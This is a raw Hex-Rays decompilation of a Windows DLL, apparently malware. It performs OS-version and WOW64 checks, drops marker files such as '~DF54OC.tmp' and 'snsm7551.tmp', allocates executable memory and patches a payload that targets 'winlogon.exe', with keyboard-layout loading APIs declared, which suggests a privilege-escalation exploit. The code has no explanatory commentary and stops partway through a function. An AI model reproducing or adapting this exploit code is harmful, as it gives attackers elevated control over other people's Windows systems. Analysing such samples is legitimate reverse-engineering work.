/* This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2009 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <defs.h>


//-------------------------------------------------------------------------
// Data declarations

extern __int16 word_1000203E; // weak
extern char byte_1000206F; // weak
extern int dword_10005080; // weak
extern int dword_10005084; // weak
extern __int16 word_10005088[]; // weak
extern wchar_t aWinlogon_exe[13]; // weak
extern wchar_t asc_100050B4[2]; // weak
extern char aIswow64process[15]; // weak
extern wchar_t aKernel32_dll[13]; // weak
extern char aGetversion[11]; // weak
extern wchar_t aDf54oc_tmp[12]; // weak
extern wchar_t aTempSnsm7551_t[19]; // weak
extern wchar_t a00000000[9]; // weak
extern wchar_t aS_4x[7]; // weak
extern wchar_t a0000[5]; // weak
extern wchar_t aLayoutId[10]; // weak
extern wchar_t aRegistryMachin[69]; // weak
extern wchar_t aKeyboardLayout[28]; // weak
extern wchar_t a_8x[5]; // weak
extern wchar_t aLayoutFile[12]; // weak
extern wchar_t asc_100052E0[2]; // weak
extern char aKeaddsystemser[24]; // weak
extern char aNtoskrnl_exe[13]; // weak
extern wchar_t aNtdll_dll[10]; // weak
extern char aNtdll[6]; // weak
extern char aRegopenkeyexw[14]; // weak
extern char aPostquitmessag[16]; // weak
extern char aEnablewindow[13]; // weak
extern char aPostmessagea[13]; // weak
extern char aSendmessagea[13]; // weak
extern char aDispatchmessag[17]; // weak
extern char aTranslatemessa[17]; // weak
extern char aGetmessagea[12]; // weak
extern char aCallwindowproc[16]; // weak
extern char aSetwindowlonga[15]; // weak
extern char aGetwindowlonga[15]; // weak
extern char aCreatewindowex[16]; // weak
extern char aGetwindowthrea[25]; // weak
extern char aGetforegroundw[20]; // weak
extern char aKilltimer[10]; // weak
extern char aSendinput[10]; // weak
extern char aActivatekeyboa[23]; // weak
extern char aGetkeyboardl_0[22]; // weak
extern char aGetkeyboardlay[18]; // weak
extern char aUnloadkeyboard[21]; // weak
extern char aLoadkeyboard_0[20]; // weak
extern char aLoadkeyboardla[20]; // weak
extern char aNtenumeratekey[15]; // weak
extern char aNtenumerateval[20]; // weak
extern char aNtqueryvalueke[16]; // weak
extern char aNtopenkey[10]; // weak
extern char aNtclose[8]; // weak
extern char a_itow[6]; // weak
extern char aWcscat[7]; // weak
extern char aWcslen[7]; // weak
extern char aWcscpy[7]; // weak
extern char aSwprintf[9]; // weak
extern char aStrcpy[7]; // weak
extern char aRtlunicodest_0[26]; // weak
extern char aRtlunicodestri[29]; // weak
extern char aRtlinitansistr[18]; // weak
extern char aRtlinitunicode[21]; // weak
extern char aNtfreevirtualm[20]; // weak
extern char aNtallocatevirt[24]; // weak
extern char aGetcurrentpr_0[20]; // weak
extern char aGetcurrentthre[19]; // weak
extern char aResumethread[13]; // weak
extern char aExitthread[11]; // weak
extern char aCreatethread[13]; // weak
extern char aUnmapviewoffil[16]; // weak
extern char aMapviewoffile[14]; // weak
extern char aCreatefilemapp[19]; // weak
extern char aWaitforsingleo[20]; // weak
extern char aSetevent[9]; // weak
extern char aOpeneventa[11]; // weak
extern char aCreateeventa[13]; // weak
extern char aSleep[6]; // weak
extern char aGetcurrentproc[18]; // weak
extern char aHeapfree[9]; // weak
extern char aHeapalloc[10]; // weak
extern char aHeapdestroy[12]; // weak
extern char aHeapcreate[11]; // weak
extern char aGetwindowsdire[21]; // weak
extern char aGettempfilenam[17]; // weak
extern char aGettemppathw[13]; // weak
extern char aGettemppatha[13]; // weak
extern char aGetsystemdir_0[20]; // weak
extern char aGetsystemdirec[20]; // weak
extern char aGetprocessheap[15]; // weak
extern char aGetlasterror[13]; // weak
extern char aGetfilesize[12]; // weak
extern char aWritefile[10]; // weak
extern char aReadfile[9]; // weak
extern char aClosehandle[12]; // weak
extern char aDeletefilew[12]; // weak
extern char aDeletefilea[12]; // weak
extern char aCreatefilew[12]; // weak
extern char aCreatefilea[12]; // weak
extern char aVirtualquery[13]; // weak
extern char aVirtualfree[12]; // weak
extern char aVirtualalloc[13]; // weak
extern wchar_t aAdvapi32_dll[13]; // weak
extern wchar_t aUser32_dll_0[11]; // weak
extern _UNKNOWN unk_100058C8; // weak
extern _UNKNOWN unk_100058CC; // weak
extern _UNKNOWN loc_10006C6E; // weak
extern _UNKNOWN loc_10006FFB; // weak
extern _UNKNOWN loc_10007357; // weak
extern _UNKNOWN loc_100073C2; // weak
extern _UNKNOWN sub_10007C56; // weak
extern _UNKNOWN sub_10008286; // weak
extern _UNKNOWN loc_100083AF; // weak
extern _UNKNOWN loc_10009E51; // weak
extern _UNKNOWN sub_1000A064; // weak
extern int dword_1000A0F0; // weak
extern char a_text[6]; // weak
extern char a_data[6]; // weak
extern char aInit[5]; // weak
extern _UNKNOWN unk_1000B058; // weak
extern char byte_1000B21B; // weak
extern int dword_1000B2C8; // weak
extern _UNKNOWN unk_1000B2CC; // weak
extern int dword_1000B2E8; // weak
extern int dword_1000B2EC; // weak
extern int dword_1000B2F0; // weak
extern int dword_1000B2F4; // weak
extern _DWORD dword_1000B2F8; // idb
extern int (__stdcall *dword_1000B2FC)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B300)(_DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B304)(_DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B308)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B30C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int dword_1000B310; // weak
extern int (__thiscall *dword_1000B314)(_DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B318)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B31C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B320)(_DWORD); // weak
extern int (__stdcall *dword_1000B324)(_DWORD, _DWORD); // weak
extern int dword_1000B328; // weak
extern int (*dword_1000B32C)(void); // weak
extern int dword_1000B330; // weak
extern int dword_1000B334; // weak
extern int (__stdcall *dword_1000B338)(_DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B33C)(_DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B340)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B344)(_DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B348)(_DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B34C)(_DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B350)(_DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B354)(_DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B358)(_DWORD); // weak
extern int (__stdcall *dword_1000B35C)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int dword_1000B360; // weak
extern int (__thiscall *dword_1000B364)(_DWORD, _DWORD); // weak
extern int (__thiscall *dword_1000B368)(_DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B370)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B374)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B378)(_DWORD); // weak
extern int (__stdcall *dword_1000B37C)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int dword_1000B380; // weak
extern int dword_1000B384; // weak
extern int dword_1000B388; // weak
extern int dword_1000B38C; // weak
extern int (*dword_1000B390)(void); // weak
extern int (__stdcall *dword_1000B394)(_DWORD); // weak
extern int dword_1000B398; // weak
extern int dword_1000B39C; // weak
extern int (__thiscall *dword_1000B3A0)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int dword_1000B3A4; // weak
extern int (__stdcall *dword_1000B3A8)(_DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B3AC)(_DWORD, _DWORD, _DWORD); // weak
extern int dword_1000B3B0; // weak
extern int (*dword_1000B3B4)(void); // weak
extern int (__stdcall *dword_1000B3B8)(_DWORD, _DWORD); // weak
extern int dword_1000B3BC; // weak
extern int dword_1000B3C0; // weak
extern int dword_1000B3C4; // weak
extern int dword_1000B3C8; // weak
extern int dword_1000B3CC; // weak
extern int dword_1000B3D0; // weak
extern int dword_1000B3D4; // weak
extern int dword_1000B3D8; // weak
extern int dword_1000B3DC; // weak
extern int dword_1000B3E0; // weak
extern int dword_1000B3E4; // weak
extern int (__stdcall *dword_1000B3E8)(_DWORD); // weak
extern int dword_1000B3EC; // weak
extern int dword_1000B3F0; // weak
extern int (__stdcall *dword_1000B3F4)(_DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B3F8)(_DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B3FC)(_DWORD, _DWORD); // weak
extern int (__cdecl *dword_1000B400)(_DWORD, _DWORD); // weak
extern int (__cdecl *dword_1000B404)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int (__cdecl *dword_1000B408)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int (__cdecl *dword_1000B40C)(_DWORD, _DWORD); // weak
extern int (__cdecl *dword_1000B410)(_DWORD, _DWORD); // weak
extern int (__thiscall *dword_1000B414)(_DWORD); // weak
extern int (__stdcall *dword_1000B418)(_DWORD); // weak
extern int (__stdcall *dword_1000B41C)(_DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B420)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int (__stdcall *dword_1000B424)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int dword_1000B428; // weak
extern int (__stdcall *dword_1000B42C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
extern int dword_1000B430; // weak
extern int dword_1000B434; // weak

//-------------------------------------------------------------------------
// Function declarations

BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
// signed int __usercall sub_10001015<eax>(int a1<ebx>, int a2, unsigned int a3, int a4);
// signed int __usercall Tml_1<eax>(int a1<ebx>, int a2<ebp>, int a3<edi>, int a4<esi>, int a5, unsigned int a6, int a7);
int __cdecl loc_1000110C(int, int, int, int, int); // weak
int __cdecl sub_1000115E(int a1, int a2, int a3, unsigned int a4);
signed int __cdecl sub_100011BE(int a1, unsigned int a2, int a3, int a4);
int __cdecl sub_10001354(int a1);
signed int __cdecl sub_1000136D(int a1, int a2, unsigned int a3);
signed int __cdecl sub_100013E1();
signed int __cdecl sub_1000144D(int a1);
signed int __cdecl sub_100014B4();
// signed int __usercall sub_1000151E<eax>(int a1<ebx>);
// int __usercall sub_1000163A<eax>(int a1<ebx>);
// int __usercall sub_100016BC<eax>(int a1<ebx>, unsigned __int16 a2);
int __cdecl sub_100016F0(int a1, int a2, int a3, int a4, int a5, int a6, int a7);
signed int __cdecl sub_10001772(__int16 a1, int a2, int a3, int a4, int a5);
int __cdecl sub_10001806(int a1);
int __cdecl sub_10001836(unsigned int a1, int a2, int a3);
char __cdecl sub_10001CF4(int a1, unsigned int a2, int a3);
char __cdecl sub_10001D65(unsigned int a1, int a2);
signed int __cdecl sub_10001EEE(int a1, int a2, int a3);
signed int __cdecl sub_10002070(int a1, int a2);
signed int __cdecl sub_100020BC(int a1, int a2, int a3);
unsigned int __cdecl sub_10002194(int a1, int a2);
int __cdecl sub_1000224F(int a1);
// signed int __usercall sub_1000250B<eax>(int a1<esi>, int a2, int a3);
signed int __cdecl sub_100026D6(int a1, int a2, unsigned int a3, int a4, int a5);
int __cdecl sub_1000297C(_DWORD, _DWORD); // weak
signed int __cdecl sub_10002B0A(int a1, int a2, int a3, int a4, int a5, int a6);
signed int __cdecl sub_10002BC1(int a1, unsigned int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9);
signed int __cdecl sub_10002CF0(int a1);
signed int __cdecl sub_10002D55(int a1, int a2, int a3, int a4);
signed int __cdecl sub_10002E6F(int a1, int a2);
signed int __cdecl sub_10002F15(unsigned int a1, int a2);
signed int __cdecl sub_10002FBC(unsigned int a1, int a2);
signed int __cdecl sub_100030E3(unsigned int a1, int a2);
signed int __cdecl sub_100031CC(int a1);
signed int __cdecl sub_10003249(int a1, int a2, int a3, int a4, int a5);
signed int __cdecl sub_1000326C(int a1);
signed int __cdecl sub_100032F7(int a1, int a2, int a3, int a4, int a5, int a6, int a7);
_DWORD __cdecl sub_10003508(_DWORD); // weak
int __cdecl sub_1000382A();
signed int __cdecl sub_10003841(int a1);
unsigned int __cdecl sub_1000387A(int a1, unsigned int a2);
int __cdecl sub_10003894(int a1, int a2);
int __cdecl sub_100038C8(int a1, int a2, unsigned int a3);
int __cdecl sub_10003907(int a1, int a2, int a3);
int __cdecl sub_10003929(int a1);
int __cdecl sub_10003943(int a1);
// void *__usercall sub_10003956<eax>(int a1<ebx>, void *a2, char a3, unsigned int a4);
int __cdecl sub_10003989(int a1);
int __cdecl sub_1000399B(int a1, int a2);
int __cdecl sub_100039E6(int a1, int a2);
int __cdecl sub_10003A1D(int a1, int a2, unsigned int a3);
int __cdecl sub_10003A6D(int a1);
int __cdecl sub_10003AC9(int a1, signed int a2);
signed int __cdecl sub_10003C57(int a1, unsigned int a2, int a3);
signed int __cdecl sub_10003CB8();
// int __usercall sub_10004A7A<eax>(int a1<ebx>, int *a2);
signed int __cdecl sub_10004AA4(int a1, unsigned int a2, int a3, int a4);
signed int __cdecl sub_10004B27(int a1, int a2, int a3);
int __cdecl sub_10004B90(int a1);
int __cdecl sub_10004B9B(int a1);
// signed int __usercall sub_10004BA6<eax>(int a1<esi>, int a2);
// signed int __usercall sub_10004C1F<eax>(int a1<ecx>, int a2<esi>);
signed int __cdecl sub_10004D27(int a1, int a2, int a3, int a4);
signed int __cdecl sub_10004E6F(int a1, int a2, unsigned int a3, int a4);
int __cdecl sub_10004EEF(int a1);
signed int __cdecl sub_10004EFA(int a1, int a2);
int __cdecl sub_10006A08(int a1, int a2);
char __cdecl sub_10006AC6(unsigned int a1);
char __cdecl sub_10006C34(int a1, int a2);
// __int16 *__usercall sub_10006FAC<eax>(int a1<ebx>);
int __cdecl sub_100072AD(int a1, int a2, char a3, int a4);
int *__cdecl sub_10007386();
signed int __stdcall sub_100083EA(int a1);
// void *__usercall sub_10008469<eax>(int a1<ebx>, void *a2, char a3, unsigned int a4);
unsigned int __cdecl sub_100084C2(const char *a1);
int __cdecl sub_100084E9(int a1, int a2);
int __cdecl sub_1000859C(int a1, int a2);
int __cdecl sub_100085F5(int a1, int a2);
int __stdcall sub_1000860C(int a1, int a2, int a3, unsigned int a4);
__int16 *__cdecl sub_10009DF4();


//----- (10001000) --------------------------------------------------------
BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  BOOL result; // eax@1

  result = 1;
  if ( fdwReason != 1 )
    result = fdwReason == 0;
  return result;
}

//----- (10001015) --------------------------------------------------------
signed int __usercall sub_10001015<eax>(int a1<ebx>, int a2, unsigned int a3, int a4)
{
  signed int result; // eax@1
  signed int v5; // esi@6
  int v6; // [sp+0h] [bp-44h]@1
  char v7; // [sp+4h] [bp-40h]@1
  int v8; // [sp+40h] [bp-4h]@1

  v6 = 0;
  sub_10003956(a1, &v7, 0, 0x3Cu);
  v8 = 0;
  result = sub_100013E1();
  if ( !(_WORD)result )
  {
    result = sub_100014B4();
    if ( !(_WORD)result )
    {
      result = sub_10003CB8();
      if ( !(_WORD)result )
      {
        result = sub_1000151E(a1);
        if ( !(_WORD)result )
        {
          result = sub_10003508(&v6);
          if ( !(_WORD)result )
          {
            v5 = sub_100011BE(a2, a3, a4, (int)&v8);
            if ( !(_WORD)v5 )
            {
              v5 = sub_1000297C(&v6, v8);
              if ( !(_WORD)v5 )
              {
                sub_10001354(v8);
                v8 = 0;
              }
            }
            sub_100016BC(a1, v5);
            result = v5;
          }
        }
      }
    }
  }
  return result;
}
// 1000297C: using guessed type int __cdecl sub_1000297C(_DWORD, _DWORD);
// 10003508: using guessed type _DWORD __cdecl sub_10003508(_DWORD);

//----- (100010B5) --------------------------------------------------------
signed int __usercall Tml_1<eax>(int a1<ebx>, int a2<ebp>, int a3<edi>, int a4<esi>, int a5, unsigned int a6, int a7)
{
  int v8; // eax@1
  char v9; // [sp-8h] [bp-8h]@1
  int (__cdecl *v10)(int, int, int, int, int); // [sp-4h] [bp-4h]@1

  dword_1000B2C8 = (int)&unk_1000B2CC;
  v10 = loc_1000110C;
  v8 = dword_1000B2C8;
  *(_DWORD *)(dword_1000B2C8 + 4) = a2;
  *(_DWORD *)(v8 + 8) = a3;
  *(_DWORD *)(v8 + 12) = a4;
  *(_DWORD *)(v8 + 16) = a1;
  *(_DWORD *)v8 = &v9;
  return sub_10001015(a1, a5, a6, a7);
}
// 1000110C: using guessed type int __cdecl loc_1000110C(int, int, int, int, int);
// 1000B2C8: using guessed type int dword_1000B2C8;

//----- (1000114E) --------------------------------------------------------
#error "FFFFFFFF: positive sp value has been found (funcsize=0)"

//----- (1000115E) --------------------------------------------------------
int __cdecl sub_1000115E(int a1, int a2, int a3, unsigned int a4)
{
  int v4; // esi@1
  int v5; // edi@6
  int result; // eax@11
  int v7; // [sp+Ch] [bp-4h]@1
  int v8; // [sp+18h] [bp+8h]@5

  v7 = 0;
  v4 = a1;
  if ( a1 && a3 && a2 && a4 )
  {
    v8 = a2 + 1;
    if ( a4 < a2 + 1 )
    {
      v5 = a4 - v4;
      do
      {
        if ( !sub_100038C8(v4, a3, a4) )
        {
          if ( v7 )
            goto LABEL_12;
          v7 = v4;
        }
        ++v4;
      }
      while ( v5 + v4 < (unsigned int)v8 );
    }
    result = v7;
  }
  else
  {
LABEL_12:
    result = 0;
  }
  return result;
}

//----- (100011BE) --------------------------------------------------------
signed int __cdecl sub_100011BE(int a1, unsigned int a2, int a3, int a4)
{
  int v4; // eax@1
  int v5; // edx@1
  int v6; // ecx@1
  signed int result; // eax@7
  int v8; // eax@12
  int v9; // esi@16
  int v10; // edi@22
  int v11; // eax@26
  int v12; // edi@26
  int v13; // esi@26
  int v14; // eax@26
  int v15; // eax@28
  int v16; // ebx@28
  int v17; // eax@30
  int v18; // esi@30
  int v19; // ST28_4@30
  int v20; // [sp+0h] [bp-14h]@1
  int v21; // [sp+4h] [bp-10h]@15
  int v22; // [sp+8h] [bp-Ch]@1
  int v23; // [sp+Ch] [bp-8h]@2
  int v24; // [sp+10h] [bp-4h]@12

  v4 = a3;
  v5 = 0;
  v6 = 0;
  v22 = 9460301;
  v20 = -302076661;
  if ( a3 )
  {
    while ( *(_WORD *)v4 )
    {
      v4 += 2;
      ++v6;
    }
    v23 = 2 * v6;
  }
  else
  {
    v23 = -1;
  }
  if ( a1 )
  {
    if ( a2 )
    {
      if ( (unsigned int)v23 <= 0x40 )
      {
        v8 = dword_1000A0F0;
        v24 = 0;
        if ( &unk_100058C8 && &v22 && dword_1000A0F0 )
        {
          v21 = dword_1000A0F0 + 1;
          if ( (unsigned int)(dword_1000A0F0 + 1) > 4 )
          {
            v9 = (int)&unk_100058C8;
            do
            {
              if ( !sub_100038C8(v9, (int)&v22, 4u) )
              {
                if ( v24 )
                  goto LABEL_25;
                v24 = v9;
              }
              ++v9;
            }
            while ( 4 - (_DWORD)&unk_100058C8 + v9 < (unsigned int)v21 );
            v8 = dword_1000A0F0;
            v5 = 0;
          }
          v10 = v24;
        }
        else
        {
          v10 = 0;
        }
        if ( v10 == v5 )
        {
LABEL_25:
          result = 1757151332;
        }
        else
        {
          v12 = v10 - (_DWORD)&unk_100058C8;
          v14 = v8 - v12 - 4;
          v13 = a2 + v14 + v12;
          v21 = v14;
          v11 = dword_1000B2FC(v5, a2 + v14 + v12, 4096, 64);
          v24 = v11;
          if ( v11 )
          {
            sub_10003907(v11, (int)&unk_100058C8, v12);
            v16 = v12 + v24;
            sub_10003956(v12 + v24, (void *)(v12 + v24), 0, a2);
            sub_10003907(v16 + a2, (int)((char *)&unk_100058CC + v12), v21);
            v15 = sub_1000115E(v24, v13, (int)&v20, 4u);
            if ( v15 )
            {
              v19 = v13;
              v18 = v24;
              *(_DWORD *)v15 = a2;
              *(_DWORD *)(v16 - 4) = a2;
              v17 = sub_1000115E(v18, v19, (int)L"winlogon.exe", 0x1Au);
              if ( v17 )
              {
                sub_10003907(v17, a3, v23 + 2);
                sub_10003907(v16, a1, a2);
                *(_DWORD *)a4 = v18;
                result = 1758068736;
              }
              else
              {
                result = 1757741156;
              }
            }
            else
            {
              result = 1759051876;
            }
          }
          else
          {
            result = 1755971587;
          }
        }
      }
      else
      {
        result = 1756823553;
      }
    }
    else
    {
      result = 1756561409;
    }
  }
  else
  {
    result = 1756364801;
  }
  return result;
}
// 10005098: using guessed type wchar_t aWinlogon_exe[13];
// 1000A0F0: using guessed type int dword_1000A0F0;
// 1000B2FC: using guessed type int (__stdcall *dword_1000B2FC)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (10001354) --------------------------------------------------------
int __cdecl sub_10001354(int a1)
{
  int result; // eax@2

  if ( a1 )
    result = dword_1000B300(a1, 0, 32768);
  return result;
}
// 1000B300: using guessed type int (__stdcall *dword_1000B300)(_DWORD, _DWORD, _DWORD);

//----- (1000136D) --------------------------------------------------------
signed int __cdecl sub_1000136D(int a1, int a2, unsigned int a3)
{
  signed int result; // eax@2
  int v4; // eax@5

  if ( a1 )
  {
    if ( a2 )
    {
      v4 = dword_1000B344(a2, a3);
      if ( v4 && v4 <= a3 )
      {
        if ( sub_10003C57(a2, a3, (int)L"\\") >= 0 )
        {
          if ( sub_10003C57(a2, a3, a1) >= 0 )
            result = 1762918400;
          else
            result = 1762788348;
        }
        else
        {
          result = 1760363516;
        }
      }
      else
      {
        result = 1759772674;
      }
    }
    else
    {
      result = 1761476609;
    }
  }
  else
  {
    result = 1761542145;
  }
  return result;
}
// 100050B4: using guessed type wchar_t asc_100050B4[2];
// 1000B344: using guessed type int (__stdcall *dword_1000B344)(_DWORD, _DWORD);

//----- (100013E1) --------------------------------------------------------
signed int __cdecl sub_100013E1()
{
  int v0; // esi@1
  signed int result; // eax@2
  int v2; // esi@3
  signed int v3; // eax@3
  int v4; // eax@5
  int v5; // [sp+4h] [bp-4h]@1

  v5 = 0;
  v0 = sub_10003A6D((int)L"kernel32.dll");
  if ( v0 )
  {
    v3 = sub_10003841((int)"IsWow64Process");
    v2 = sub_10003AC9(v0, v3);
    if ( v2 )
    {
      v4 = sub_1000382A();
      if ( ((int (__stdcall *)(int, int *))v2)(v4, &v5) >= 0 )
      {
        result = 1765474387;
        if ( !v5 )
          result = 1765539840;
      }
      else
      {
        result = 1765015554;
      }
    }
    else
    {
      result = 1764818944;
    }
  }
  else
  {
    result = 1762133018;
  }
  return result;
}
// 100050C8: using guessed type wchar_t aKernel32_dll[13];

//----- (1000144D) --------------------------------------------------------
signed int __cdecl sub_1000144D(int a1)
{
  int v1; // edi@1
  int v2; // esi@1
  signed int result; // eax@2
  int v4; // eax@3
  signed int v5; // eax@3
  __int16 v6; // ax@5
  unsigned __int8 v7; // dl@5

  v2 = sub_1000382A();
  v1 = sub_10003A6D((int)L"kernel32.dll");
  if ( v1 )
  {
    v5 = sub_10003841((int)"GetVersion");
    v4 = sub_10003AC9(v1, v5);
    if ( v4 )
    {
      v6 = ((int (*)(void))v4)();
      v7 = *(_BYTE *)(v2 + 175);
      *(_DWORD *)(a1 + 4) = HIBYTE(v6);
      *(_WORD *)(a1 + 8) = v7;
      *(_DWORD *)a1 = (unsigned __int8)v6;
      result = 1767505920;
    }
    else
    {
      result = 1766850645;
    }
  }
  else
  {
    result = 1764688922;
  }
  return result;
}
// 100050C8: using guessed type wchar_t aKernel32_dll[13];

//----- (100014B4) --------------------------------------------------------
signed int __cdecl sub_100014B4()
{
  signed int result; // eax@1
  unsigned int v1; // eax@2
  int v2; // ecx@2
  int v3; // [sp+4h] [bp-Ch]@1
  int v4; // [sp+8h] [bp-8h]@1
  int v5; // [sp+Ch] [bp-4h]@1

  v3 = 0;
  v4 = 0;
  v5 = 0;
  result = sub_1000144D((int)&v3);
  if ( !(_WORD)result )
  {
    v2 = 0;
    v1 = 0;
    while ( v3 != *(int *)((char *)&dword_10005080 + v1) || v4 != *(int *)((char *)&dword_10005084 + v1) )
    {
      v1 += 12;
      ++v2;
      if ( v1 >= 0x18 )
        return 1766719575;
    }
    if ( (_WORD)v5 > (unsigned __int16)word_10005088[6 * v2] )
      result = 1766654032;
    else
      result = 1766522880;
  }
  return result;
}
// 10005080: using guessed type int dword_10005080;
// 10005084: using guessed type int dword_10005084;
// 10005088: using guessed type __int16 word_10005088[];

//----- (1000151E) --------------------------------------------------------
signed int __usercall sub_1000151E<eax>(int a1<ebx>)
{
  int v1; // eax@1
  int v2; // eax@3
  signed int result; // eax@4
  int v4; // eax@5
  int v5; // eax@7
  __int16 v6; // [sp+Ch] [bp-820h]@1
  char v7; // [sp+Eh] [bp-81Eh]@1
  __int16 v8; // [sp+41Ch] [bp-410h]@1
  char v9; // [sp+41Eh] [bp-40Eh]@1

  v8 = 0;
  sub_10003956(a1, &v9, 0, 0x40Eu);
  v6 = 0;
  sub_10003956(a1, &v7, 0, 0x40Eu);
  v1 = dword_1000B354(&v8, 520);
  if ( v1 && (unsigned int)v1 <= 0x208 )
  {
    dword_1000B410(&v8, L"\\Temp\\snsm7551.tmp");
    v2 = dword_1000B30C(&v8, -2147483648, 1, 0, 3, 128, 0);
    if ( v2 == -1 )
    {
      v4 = dword_1000B350(520, &v6);
      if ( v4 && (unsigned int)v4 <= 0x208 )
      {
        dword_1000B410(&v6, L"~DF54OC.tmp");
        v5 = dword_1000B30C(&v6, 1073741824, 0, 0, 1, 128, 0);
        if ( v5 == -1 )
        {
          dword_1000B320(-1);
          result = 1770061836;
        }
        else
        {
          dword_1000B320(v5);
          result = 1770455040;
        }
      }
      else
      {
        result = 1771503618;
      }
    }
    else
    {
      dword_1000B320(v2);
      result = 1768816651;
    }
  }
  else
  {
    result = 1768226818;
  }
  return result;
}
// 100050F0: using guessed type wchar_t aDf54oc_tmp[12];
// 10005108: using guessed type wchar_t aTempSnsm7551_t[19];
// 1000B30C: using guessed type int (__stdcall *dword_1000B30C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B320: using guessed type int (__stdcall *dword_1000B320)(_DWORD);
// 1000B350: using guessed type int (__stdcall *dword_1000B350)(_DWORD, _DWORD);
// 1000B354: using guessed type int (__stdcall *dword_1000B354)(_DWORD, _DWORD);
// 1000B410: using guessed type int (__cdecl *dword_1000B410)(_DWORD, _DWORD);

//----- (1000163A) --------------------------------------------------------
int __usercall sub_1000163A<eax>(int a1<ebx>)
{
  int v1; // eax@4
  int result; // eax@6
  int v3; // ST08_4@6
  _WORD v4[1024]; // [sp+4h] [bp-800h]@1

  v4[0] = 0;
  sub_10003956(a1, &v4[1], 0, 0x7FEu);
  if ( dword_1000B350
    && dword_1000B410
    && dword_1000B314
    && (v1 = dword_1000B350(1024, v4)) != 0
    && (unsigned int)v1 <= 0x400 )
  {
    dword_1000B410(v4, L"~DF54OC.tmp");
    result = dword_1000B314(v3, v4);
  }
  else
  {
    result = 0;
  }
  return result;
}
// 100050F0: using guessed type wchar_t aDf54oc_tmp[12];
// 1000B314: using guessed type int (__thiscall *dword_1000B314)(_DWORD, _DWORD);
// 1000B350: using guessed type int (__stdcall *dword_1000B350)(_DWORD, _DWORD);
// 1000B410: using guessed type int (__cdecl *dword_1000B410)(_DWORD, _DWORD);

//----- (100016BC) --------------------------------------------------------
int __usercall sub_100016BC<eax>(int a1<ebx>, unsigned __int16 a2)
{
  int result; // eax@1

  result = a2;
  if ( (signed int)a2 <= 83 )
  {
    if ( (signed int)a2 < 80 && (signed int)a2 > 3 && a2 != 10 )
      return result;
    return sub_1000163A(a1);
  }
  if ( (signed int)a2 >= 85 && ((signed int)a2 <= 87 || a2 == 3120) )
    return sub_1000163A(a1);
  return result;
}

//----- (100016F0) --------------------------------------------------------
int __cdecl sub_100016F0(int a1, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v7; // ebx@1
  int v8; // esi@1
  int v9; // edi@1
  int result; // eax@3
  char v11; // [sp+Ch] [bp-2C4h]@1
  char v12; // [sp+Dh] [bp-2C3h]@1

  v7 = *(_DWORD *)(a7 + 4);
  v9 = *(_DWORD *)a7;
  v11 = 0;
  sub_10003956(v7, &v12, 0, 0x2C3u);
  v8 = dword_1000B2EC + *(_DWORD *)(a7 + 48);
  if ( v9 != 5 )
    goto LABEL_9;
  if ( !v7 )
    return ((int (__stdcall *)(int, int, int, int, int, int))v8)(a1, a2, a3, a4, a5, a6);
  if ( v7 != 1 )
LABEL_9:
    result = 0;
  else
    result = ((int (__stdcall *)(int, int, char *, int, int, int, int))v8)(a1, a2, &v11, a3, a4, a5, a6);
  return result;
}
// 1000B2EC: using guessed type int dword_1000B2EC;

//----- (10001772) --------------------------------------------------------
signed int __cdecl sub_10001772(__int16 a1, int a2, int a3, int a4, int a5)
{
  int v6; // esi@1
  int v7; // eax@1
  int v8; // ST0C_4@1
  int v9; // ST10_4@1
  __int16 v10; // [sp+Ch] [bp-14h]@1
  int v11; // [sp+Eh] [bp-12h]@1
  int v12; // [sp+12h] [bp-Eh]@1
  int v13; // [sp+16h] [bp-Ah]@1
  int v14; // [sp+1Ah] [bp-6h]@1

  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  dword_1000B414(a2 << 10);
